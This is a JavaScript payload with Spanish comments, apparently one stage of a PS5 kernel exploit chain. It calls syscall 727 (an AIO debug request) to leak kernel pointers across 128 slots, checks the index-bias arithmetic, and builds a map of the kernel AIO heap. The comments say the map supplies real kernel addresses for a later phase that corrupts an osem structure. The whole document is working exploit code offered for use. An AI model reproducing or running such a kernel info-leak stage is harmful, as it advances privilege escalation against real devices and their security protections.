// sim: hang-expected — el bucle final de notificacion/yield se cuelga a proposito (veredicto legible en consola).
// leakmap_1320.js — enumerador del leak 727 (GET_AIO_DEBUG_REQUEST_INFO).
// Paste BAGAGWA §3: el copy loop usa el slot (req_id>>16)+edx como sesgo
// DENTRO de otra array -> cada slot < 0x80 copia a userland 2 punteros kernel
// + 1 dword (elemento de 0x18 en dst). Este payload barre los 128 slots con
// count adaptativo (1 primero; 0 si EINVAL — el count esta acotado [1,0x228])
// y construye la cartografia del heap kernel de AIO: cuantos slots viven,
// que punteros distinctos devuelven y en que banda caen.
// POR QUE IMPORTA: la fase de conversión (osem_conv) necesita direcciones
// kernel REALES para apuntar el dec del waker a un osem+0x54. Hoy sabemos
// detectar; para dirigir hay que mapear. Este barrido es read-only: no
// invoca nada de BAGAGWA (no mode 0, no reclaim, no wake).
// Prueba de sesgo: slot 0 con count=2 debe devolver en su elemento 1 lo
// mismo que slot 1 con count=1 -> confirma la aritmetica (slot+edx) del paste.
(() => {
    const B = (x) => BigInt(x);
    const I = (x) => BigInt.asIntN(64, x);
    const Y = 331n;
    const A_DEBUG = 0x2D7n;      // 727
    const A_INIT = 0x29En;       // aio_init: pulso de vida de la familia
    const say = (s) => { try { log("[leakmap] " + s); } catch (e) {} };
    const notif = (s) => { try { send_notification(("[leakmap] " + s).slice(0, 120)); } catch (e) {} };
    const EN = () => { try { const m = /^(\d+)/.exec(get_error_string()); return m ? parseInt(m[1], 10) : -1; } catch (e) { return -1; } };
    const ENX = { 1: "EPERM", 9: "EBADF", 14: "EFAULT", 22: "EINVAL", 35: "EAGAIN", 78: "ENOSYS", 93: "ENOTCAPABLE" };
    const J = (e) => " errno=" + e + "(" + (ENX[e] || "?") + ")";
    const FX = (v) => "0x" + B(v).toString(16);
    const VS = (q) => q.ex ? "EX(" + q.msg + ")" : (q.r >= 0n ? "ok0x" + q.r.toString(16) : "e" + q.e + (ENX[q.e] ? "(" + ENX[q.e] + ")" : ""));

    say("begin - 727 leak map pid=" + I(syscall(SYSCALL.getpid))
        + " fw=" + (PS5.fw || "?") + " mode=" + (PS5.mode || "?"));

    // F0: la familia y el canal 727 estan vivos? (si no: abort sin barrer)
    const qInit = { r: -1n, e: -1, ex: false };
    try { qInit.r = I(syscall(A_INIT, 0n)); if (qInit.r < 0n) qInit.e = EN(); } catch (e) { qInit.ex = true; }
    if (qInit.r < 0n && qInit.e === 78) {
        say("VERDICT: CANAL MUERTO (aio_init ENOSYS -> familia vetada; no hay 727 que barrer)");
        notif("leakmap: AIO dead, no hay canal");
        return;
    }
    // 727 en stub mode no tiene stub C: requiere SYSCALL_RAW del bridge.
    if (PS5.stubMode) {
        const raw = (typeof SYSCALL_RAW !== "undefined" && SYSCALL_RAW)
            || (PS5.rawSyscall === true);
        if (!raw) {
            say("VERDICT: 727 INALCANZABLE en stub mode sin SYSCALL_RAW (sin stub C)");
            notif("leakmap: 727 necesita raw");
            return;
        }
    }

    // count adaptativo: el paste acota count a [1, table->0x228]; si arg2
    // fuera flags en este fw, el neutro seria 0. Probamos 1 -> 0 -> recordamos.
    let cnt = null;
    const buf = malloc(0x40);
    const call727 = (id, count, tag) => {
        const q = { r: -1n, e: -1, ex: false, msg: "" };
        try { q.r = I(syscall(A_DEBUG, B(id), buf, B(count))); if (q.r < 0n) q.e = EN(); }
        catch (err) { q.ex = true; q.msg = String(err && err.message || err).slice(0, 50); }
        return q;
    };
    const probeCount = () => {
        for (const c of [1, 0]) {
            const q = call727(1n, c, "probe");   // id=1: slot 0 (id 0 podria ser especial)
            if (q.ex) return null;
            if (q.r >= 0n) { cnt = c; return c; }
            if (q.e === 78) { say("VERDICT: CANAL MUERTO (727 ENOSYS)"); notif("leakmap: 727 ENOSYS"); return null; }
            if (q.e === 14) { say("VERDICT: 727 EFAULT persistente (dst legible!) — abort"); notif("leakmap: 727 EFAULT"); return null; }
            // EINVAL/etc con este count: probar el otro
        }
        say("VERDICT: ambos counts rechazados (EINVAL) — el 727 existe pero la shape no es (id,dst,count)");
        notif("leakmap: shape 727 no valida");
        return null;
    };
    say("F0: aio_init=" + VS(qInit) + " | sondando count del 727...");
    if (probeCount() === null) { say("PAYLOAD DONE (canal inoperativo)"); return; }
    say("F0: count operativo = " + cnt);

    // F1: barrido de slots 0..0x7F (req_id = slot<<16; low16=0)
    const slots = [];
    let enosysSeen = 0;
    for (let s = 0; s < 0x80; s++) {
        const id = B(s) << 16n;
        const q = call727(id, cnt, "sweep");
        if (q.ex) { say("F1: EX en slot " + s + " (" + q.msg + ") -> abort"); break; }
        if (q.r >= 0n) {
            const p1 = read64(buf), p2 = read64(buf + 8n), d = read32(buf + 0x10n);
            slots.push({ s, p1, p2, d });
        } else if (q.e === 78) { enosysSeen++; if (enosysSeen > 4) { say("F1: ENOSYS persistente -> canal muerto a mitad de barrido (slot " + s + ")"); break; } }
        if ((s & 0xf) === 0) say("F1: barrido hasta slot 0x" + s.toString(16) + "...");
    }
    say("F1: " + slots.length + "/0x80 slots filtraron datos");

    // F2: prueba de sesgo (slot+edx): slot 0 count 2, elemento 1 == slot 1 count 1
    let bias = "SKIP";
    if (slots.length >= 2) {
        const q02 = call727(0n, 2, "bias");
        if (!q02.ex && q02.r >= 0n) {
            const b1p1 = read64(buf + 0x18n), b1p2 = read64(buf + 0x20n), b1d = read32(buf + 0x28n);
            const s1 = slots.find((w) => w.s === 1);
            bias = (s1 && b1p1 === s1.p1 && b1p2 === s1.p2 && b1d === s1.d)
                ? "MATCH (elem1 de (slot0,count2) == slot1 -> aritmetica slot+edx CONFIRMADA)"
                : "MISMATCH (elem1=" + FX(b1p1) + " vs slot1=" + (s1 ? FX(s1.p1) : "?") + ")";
        } else if (!q02.ex) bias = "count=2 rechazado (" + VS(q02) + ")";
        say("F2: bias " + bias);
    }

    // F3: estadisticas — punteros distinctos y bandas
    const distinct = new Map(); const bands = new Map();
    for (const w of slots) {
        for (const p of [w.p1, w.p2]) {
            distinct.set(p, (distinct.get(p) || 0) + 1);
            const b = (p >> 40n).toString(16);
            bands.set(b, (bands.get(b) || 0) + 1);
        }
    }
    say("F3: " + distinct.size + " punteros distinctos | bandas(high40): "
        + [...bands.entries()].map(([k, v]) => "0x" + k + "x" + v).join(" "));

    // F4: tabla (solo slots con datos) — al PC via log
    for (let i = 0; i < slots.length; i++)
        say("SLOT 0x" + slots[i].s.toString(16) + " ptr1=" + FX(slots[i].p1)
            + " ptr2=" + FX(slots[i].p2) + " dword=" + FX(slots[i].d));

    let v;
    if (slots.length === 0) v = "NO SLOT LEAKED (727 responde pero ningun slot filtra: tabla vacia o sesgo distinto)";
    else v = slots.length + "/0x80 SLOTS LEAKED, " + distinct.size + " punteros distinctos | bias " + bias;
    say("VERDICT: " + v);
    notif("leakmap: " + v);
    say("PAYLOAD DONE");
    for (let i = 0; i < 8; i++) { notif("leakmap: " + v); for (let j = 0; j < 1000; j++) { try { syscall(Y); } catch (e) {} } }
})();
